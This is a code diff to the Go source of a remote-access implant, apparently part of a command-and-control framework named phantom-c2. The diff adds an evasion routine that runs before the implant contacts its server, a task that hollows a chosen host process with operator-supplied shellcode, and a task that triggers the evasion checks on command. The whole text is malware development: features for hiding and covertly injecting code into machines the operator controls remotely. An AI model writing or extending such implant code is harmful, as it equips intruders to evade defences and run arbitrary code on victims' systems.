@@ -2,9 +2,10 @@ package implant
 
 import (
 	"crypto/rsa"
-	"os"
 	"fmt"
+	"os"
 	"strconv"
+	"strings"
 
 	"github.com/phantom-c2/phantom/internal/protocol"
 )
@@ -42,6 +43,9 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 	if CheckKillDate(killDate) {
 		return
 	}
+
+	// Run evasion techniques before any network activity
+	InitEvasion()
 
 	// Collect system info
 	sysinfo := CollectSysInfo()
@@ -201,6 +205,20 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 		} else {
 			err = errMissingArgs("inject requires PID and shellcode data")
 		}
+
+	case protocol.TaskHollow:
+		if len(task.Args) > 0 && len(task.Data) > 0 {
+			err = ProcessHollow(task.Args[0], task.Data)
+			if err == nil {
+				output = []byte(fmt.Sprintf("[+] Process hollowed: %s (payload injected and resumed)", task.Args[0]))
+			}
+		} else {
+			err = errMissingArgs("hollow requires host process path and shellcode data")
+		}
+
+	case protocol.TaskEvasion:
+		results := InitEvasion()
+		output = []byte(strings.Join(results, "\n"))
 
 	case protocol.TaskKill:
 		output = []byte("Agent terminating")
